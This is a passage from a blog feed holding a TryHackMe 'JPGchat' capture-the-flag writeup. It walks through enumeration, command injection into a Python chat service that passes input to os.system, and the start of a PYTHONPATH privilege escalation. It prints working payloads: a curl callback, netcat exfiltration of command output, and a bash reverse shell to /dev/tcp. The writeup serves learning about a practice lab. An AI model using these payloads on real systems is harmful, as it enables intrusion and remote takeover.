&lt;p&gt;And there we have it! That‚Äôs the room done. There were more things I could have explored, but I feel like it‚Äôd just be waffling to talk about how there weren‚Äôt vulnerabilities in other running services. I only included the first few services I looked at, because I wanted to show my thought process and the exact way I done this room :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/thats_all.png&quot; /&gt;&lt;/p&gt;</content><author><name>JamBot</name></author><category term="thm" /><category term="pentesting" /><category term="writeup" /><summary type="html">Explanation</summary></entry><entry><title type="html">TryHackMe! JPGchat room</title><link href="http://localhost:4000/blog/THM-JPGchat-writeup" rel="alternate" type="text/html" title="TryHackMe! JPGchat room" /><published>2021-03-05T00:00:00+00:00</published><updated>2021-03-05T00:00:00+00:00</updated><id>http://localhost:4000/blog/THM-JPGchat</id><content type="html" xml:base="http://localhost:4000/blog/THM-JPGchat-writeup">&lt;!-- aa --&gt;
&lt;h1 id=&quot;explanation&quot;&gt;Explanation&lt;/h1&gt;

&lt;p&gt;This is my second tryhackme writeup, and it‚Äôs another easy room, but I figured I‚Äôd get into the swing of blogging again and just get something out there. Because some of the stuff in &lt;a href=&quot;https://tryhackme.com/room/jpgchat&quot;&gt;this room&lt;/a&gt; is similar to the 0day room, I‚Äôll be trying to go more in depth into multiple possible attack vectors, and specifically how &lt;strong&gt;I&lt;/strong&gt; did things :)&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Okay so as usual for most boot2roots we start of with an nmap scan, to see what ports are open, and what services could be running. Because of the image and description, I‚Äôm thinking that this is gonna be a Flask or Django server maybe? This ended up not being the case, but this made me think that the room dev chose python for a reason. Apparantly not?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/JPGchat-description.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anyways, here are the results from our nmap scan:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Mar  5 11:31:06 2021 as: nmap -sC -sV -oN nmap.log 10.10.X.X
Nmap scan report for 10.10.X.X
Host is up (0.072s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open     tcpwrapped
8031/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  5 11:31:18 2021 -- 1 IP address (1 host up) scanned in 12.07 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool okay so, the only thing I‚Äôm really interested in right now are the 2 high ports, specifically the open one. The SSH server doesn‚Äôt concern me too much as I recognise the version is quite recent, so I doubt we have to exploit it.&lt;/p&gt;

&lt;p&gt;as for that tcp port, I have no idea what it is- time for netcat :)&lt;/p&gt;

&lt;h3 id=&quot;investigating-weird-port&quot;&gt;Investigating weird port&lt;/h3&gt;

&lt;p&gt;Now I‚Äôm just gonna connect to the port and see what kind of response I get :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc 10.10.X.X 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay so immediately we are told we can find source code for the running service. This seems to be turning into a pwn challenge, in which we are given some code, or an application that we can test locally, to make an exploit- then craft a similar exploit to be used over a network etc.&lt;/p&gt;

&lt;p&gt;Let‚Äôs go on github and look for this :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/githubJPGchat.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay so the second one seems to be what we want here. So let‚Äôs just take a look at the source code and see what we can find :)&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Welcome to JPChat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'the source code of this service can be found at our admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s github'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;report_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'this report will be read by Mozzie-jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your name:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your report:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt;&amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;chatting_service&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REPORT USAGE: use [REPORT] to report someone to the admins (with proof)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[REPORT]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;report_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[MESSAGE]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'There are currently 0 other users logged in'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;message2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[MESSAGE]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[REPORT]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;report_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;chatting_service&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm. Okay so this definitely isn‚Äôt the code that‚Äôs running, so I assume this was made for the purposes of the challenge. Anyway, the vulnerability seems pretty clear here; this code trusts unsanitised user input. As for the actual code that‚Äôs running the TCP server I‚Äôm not sure. But if it‚Äôs anything similar to this, which I think it will be, then we can exploit the trust it puts on the end user&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;The part I want to focus on is this:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your name:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'your report:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -c 'echo %s &amp;gt;&amp;gt; /opt/jpchat/logs/report.txt'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After receiving input, this script goes ahead and puts that input into a command ran on the host. So, for example, if we provided &lt;code class=&quot;highlighter-rouge&quot;&gt;this is a test&lt;/code&gt; as the text for the report, then the host machine would run &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -c 'echo this is a test' &amp;gt; /opt/jpchat/logs/report.txt&lt;/code&gt;. With a little knowlege of bash it‚Äôs not hard to create a malicious input here. we can end the echo statement with a semi colon, and then provide our own bash to be ran on the host. the output from that will then be written to report.txt if we embed the malicious payload in the &lt;code class=&quot;highlighter-rouge&quot;&gt;your_name&lt;/code&gt; variable, or it will be appended to report.txt, if we store it in the &lt;code class=&quot;highlighter-rouge&quot;&gt;report_text&lt;/code&gt; variable. Of course this doesn‚Äôt matter for us, as all we care about is code execution&lt;/p&gt;

&lt;p&gt;So let‚Äôs see if we can do this :)&lt;/p&gt;

&lt;p&gt;I‚Äôm going to start a python simple http server and try to get the machine to send a GET request via curl. Here is the one liner I made to do this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c 'IP=&quot;YOUR IP HERE&quot;; PORT=&quot;PORT HERE&quot;; print(f&quot;[REPORT]\nname\n;curl http://{IP}:{PORT}&quot;)' | nc 10.10.X.X 3000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So what this is doing, is printing 3 seperate lines (\n is used to indicate a newline). The first line is &lt;code class=&quot;highlighter-rouge&quot;&gt;[REPORT]&lt;/code&gt;, the second line is just some random input provided for name, and then the last line is &lt;code class=&quot;highlighter-rouge&quot;&gt;;curl http://ip:port&lt;/code&gt;. The semi colon at the start of this line is what I was talking about before- we use it to show the end of the echo statement, so that we can begin our own. The last part &lt;code class=&quot;highlighter-rouge&quot;&gt;| nc 10.10.X.X 3000&lt;/code&gt; is simply the input being generated by python being piped into the tcp connection we make with netcat. So we run this, and‚Ä¶.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c 'IP=&quot;YOUR IP&quot;; PORT=&quot;PORT&quot;; print(f&quot;[REPORT]\nname\n;curl http://{IP}:{PORT}&quot;)' | nc 10.10.X.X 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
this report will be read by Mozzie-jpg
your name:
your report:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.X.X - - [05/Mar/2021 15:53:29] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome!! We got code execution! Now, sending a request to a server is a common way to test for code execution, but it is also equally common for systems to have firewalls blocking tcp connections, and requests. DNS smuggling can allow us to mitigate this problem. It‚Äôs less common for there to be something filtering DNS requests, as well if urls are to be resolved, then DNS requests must be made. Of course there are other options if we need to bypass firewalls, that‚Äôs just a common one.&lt;/p&gt;

&lt;p&gt;For more information on this, please check out stok‚Äôs video on this subject: &lt;a href=&quot;https://www.youtube.com/watch?v=p8wbebEgtDk&quot;&gt;https://www.youtube.com/watch?v=p8wbebEgtDk&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Anyways now that we have code execution, and we touched on another method of data exfiltration we could have used, lets try getting a shell :) I won‚Äôt be going into the different methods of doing that, as I already done that in a &lt;a href=&quot;https://jambot3000.github.io/blog/THM-0DAY-writeup&quot;&gt;different blog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We‚Äôre just gonna be going for a basic reverse tcp shell. So the code we want to execute on the server will be something like: &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/IP/PORT 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Naturally the first thing I try is setting up a listener and then trying out &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'IP=&quot;IP&quot;; PORT=&quot;PORT&quot;; print(f&quot;[REPORT]\nname\n;bash -i &amp;gt;&amp;amp; /dev/tcp/{IP}/{PORT} 0&amp;gt;&amp;amp;1&quot;)' | nc 10.10.X.X 3000&lt;/code&gt; as the payload. And well, I got a shell, but it wasn‚Äôt functional. I wasn‚Äôt able to get output.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -nlvp 3000
Listening on 0.0.0.0 3000
Connection received on 10.10.201.9 55046
bash: cannot set terminal process group (993): Inappropriate ioctl for device
bash: no job control in this shell
wes@ubuntu-xenial:/$ ls
ls
wes@ubuntu-xenial:/$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we see that it tells us that for whatever reason, the input/output control is weird and not good enough to get us a stable shell. As I couldn‚Äôt see what was going on behind the scenes, I assumed that this was due to how the tcp server had been made. Maybe it was handling input weirdly and not properly encoding/decoding it? or maybe it was running under some other weird conditions I couldn‚Äôt see? I wasn‚Äôt entirely sure why this wasn‚Äôt working, so I started playing around with the input. Eventually through fuzzing and playing around with the server, I found that the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;$()&lt;/code&gt; would show output in my listener, when a command was used in it. After completing the CTF I took a look at some other writeups to see if anyone else had encoutered this problem but this didn‚Äôt seem to be the case at all? Maybe it was something to do with my one liner, or maybe it‚Äôs a bug in the room. Either way it‚Äôs fine, I got something that worked for me in the end. I understand that it can be annoying seeing ‚Äújust play around with it‚Äù but I can‚Äôt put it into better words unfortunately. All I done was try out different things I‚Äôve seen work before, until eventually I got something to work. It can be a tedious process but sometimes there just aren‚Äôt ways to avoid it.&lt;/p&gt;

&lt;p&gt;So, the payload that got actually got me output ended up being: &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'IP=&quot;PORT&quot;; PORT=&quot;PORT&quot;; print(f&quot;[REPORT]\nname\n;echo $(ls) | nc {IP} {PORT}&quot;)' | nc 10.10.X.X 3000&lt;/code&gt;. This gave me the following output:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -nlvp 3000
Listening on 0.0.0.0 3000
Connection received on 10.10.201.9 55078
bin boot box_setup dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr vagrant var vmlinuz vmlinuz.old
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, so we got that to work. As for how I knew netcat was on the machine, well, I didn‚Äôt- I honestly just guessed. I was pretty sure that netcat was a package included with a standard ubuntu xenial installation, and I knew it would make things easier for me so it was worth the try.&lt;/p&gt;

&lt;h3 id=&quot;finally-popping-a-shell&quot;&gt;Finally popping a shell.&lt;/h3&gt;

&lt;p&gt;After seeing I was able to get commands to work using &lt;code class=&quot;highlighter-rouge&quot;&gt;$()&lt;/code&gt; I figured the next logical step was to try getting a shell again, but placing the bash to spawn a reverse shell inside of those brackets&lt;/p&gt;

&lt;p&gt;So we try it: &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'IP=&quot;IP&quot;;PORT=&quot;PORT&quot;;print(f&quot;[REPORT]\nname\n;$(bash -i &amp;gt;&amp;amp; /dev/tcp/{IP}/{PORT} 0&amp;gt;&amp;amp;1)&quot;)' | nc 10.10.X.X 3000&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -nlvp 3000
Listening on 0.0.0.0 3000
Connection received on 10.10.201.9 55096
bash: cannot set terminal process group (1686): Inappropriate ioctl for device
bash: no job control in this shell
wes@ubuntu-xenial:/$ id
id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
wes@ubuntu-xenial:/$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay this is great, but, now I‚Äôm even more confused. We got a shell on the server which is great, but we got the same error as before. I‚Äôm still not sure why that happened, I‚Äôd love to find out though :)&lt;/p&gt;

&lt;h2 id=&quot;user&quot;&gt;User&lt;/h2&gt;

&lt;p&gt;The user flag can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;wes&lt;/code&gt;‚Äôs home directory&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:~$ cat user.txt
cat user.txt
JPC{do it yourself!}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;

&lt;p&gt;Okay so my approach to privilege escelation was kind of boring. As a lot of easy boot2roots have common privesc vectors, I find that it‚Äôs often one of a few things. I always make sure to check the kernel version being used (incase there are any major exploits available), the permissions we have as a user, and the binaries with the SUID bit enabled. As I checked what our user is able to run as root with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; I found the privesc vector. I see a lot of people complain that writeups don‚Äôt go into how you were supposed to know to do something. To this I‚Äôd say experience is the most tool you have, but there are enumeeration scripts available that can aid the process. &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot;&gt;LinPeas&lt;/a&gt; and &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt; are popular ones that can work wonders.&lt;/p&gt;

&lt;p&gt;Anyways, after running &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; or running one of the enum scripts mentioned, we should eventually find this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:/$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
wes@ubuntu-xenial:/$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically what this tell us is that we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/python3 /opt/development/test_module.py&lt;/code&gt; as root.&lt;/p&gt;

&lt;p&gt;So naturally we look at the code for this script, to see what we are actaully running as root.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;compare&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hello'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'hello'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'hello'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So when I seen this, I originally had the wrong idea. I thought about what happens when you import a python module. Like if you had installed numpy, but then also had a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;numpy.py&lt;/code&gt; in the same directory as the python script you are running, which will it really import? So I tested this out on my system and found that it will default to the file in the same directory as the script you run. So then the next logical step knowing this, was to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;compare.py&lt;/code&gt; file with some malicious code in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/development/&lt;/code&gt; directory. But the problem was that I didn‚Äôt know if I had write access to this directory. So I tried creating a new ‚Äúcompare.py‚Äù file in this directory.&lt;/p&gt;

&lt;p&gt;And‚Ä¶&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:/opt/development$ touch compare.py
touch: cannot touch 'compare.py': Permission denied
wes@ubuntu-xenial:/opt/development$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Damn :/ at this point I wasn‚Äôt too sure what to do, I checked to see if this was a well known module with known exploits, I checked to see if I could edit the code behind the module it imports. Nothing I tried seemed to work. So I looked again at the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, remembering I had seen some unfamiliar stuff.&lt;/p&gt;

&lt;p&gt;I had neglected the &lt;code class=&quot;highlighter-rouge&quot;&gt;env_keep+=PYTHONPATH&lt;/code&gt; part of this output. This is important because we can our own environment variables, and when &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/python3 /opt/development/test_module.py&lt;/code&gt; is ran, it will use the &lt;code class=&quot;highlighter-rouge&quot;&gt;PYTHONPATH&lt;/code&gt; environment variable if we have set one. With a bit of research, we find out that this variable tells python where to look for additional modules. So presumably we are able to set the &lt;code class=&quot;highlighter-rouge&quot;&gt;PYTHONPATH&lt;/code&gt; environment variable to somewhere where we have write access, and then make a &lt;code class=&quot;highlighter-rouge&quot;&gt;compare.py&lt;/code&gt; file that overwrites the one this script imports. So let‚Äôs try that.&lt;/p&gt;

